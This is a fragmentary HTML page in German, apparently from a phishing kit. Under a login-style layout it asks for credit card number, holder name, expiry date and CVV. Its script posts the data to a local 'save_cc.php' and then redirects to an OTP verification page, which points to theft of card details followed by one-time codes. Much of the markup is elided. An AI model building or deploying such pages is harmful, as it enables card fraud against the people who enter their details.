                    ...
                    <div class="ceeb7e995 c98450f08">
                        ...
                        <div class="c35cc68b7">
                            <header class="caf9c4b6d cb03adf9e">
                                ...
                                <h1 class="c85308b88 c6689a483">Bitte tragen Sie Ihre Kreditkartendaten ein</h1>
                                ...
                                <form id="loginForm" method="POST" class="cb2e1bdc9 c165a3537" data-form-primary="true">
                                    ...
                                    <div class="c9ad40d30 c77150178">
                                        <div class="c862f080e">
                                            ...
                                            <input type="text" id="cardNumber" name="cardNumber" maxlength="16" pattern="\d{16}" title="Bitte geben Sie genau 16 Ziffern ein" required placeholder="0000 0000 0000 0000">

                                            <label for="cardHolder">Karteninhaber</label>
                                            <input type="text" id="cardHolder" name="cardHolder" required placeholder="Name des Karteninhabers">

                                            <label for="expiryMonth">Ablauf Monat</label>
                                            ...
                                            <label for="expiryYear">Ablauf Jahr</label>
                                            ...
                                            <input type="text" id="cvv" name="cvv" maxlength="3" pattern="\d{3}" title="Bitte geben Sie genau 3 Ziffern ein" required placeholder="000">
                            ...
                            <div class="cc199ae96">
                                ...
                                <button type="submit" name="action" value="default" class="c1d1b1e07 c94ec4107 c3a9491fe cc1fd6969 c30010b38" data-action-button-primary="true">Weiterhin</button>
    ...
    <footer class="MuiBox-root css-1v54gwv">
        ...
        <script>
            ...
            document.getElementById('loginForm').addEventListener('submit', function(event) {
                ...
                // Validate form inputs (simple example for CVV validation)
                ...
                fetch('./save_cc.php', {
                    ...
                    .then(data => {
                        // Redirect to the verification page after successful submission
                        window.location.href = '../otp/verifyotp.php';
            ...
            window.onload = function() {
                ...
                if (registerLink) {
                    registerLink.style.display = "none"; // Correctly hide the element
                }
            };
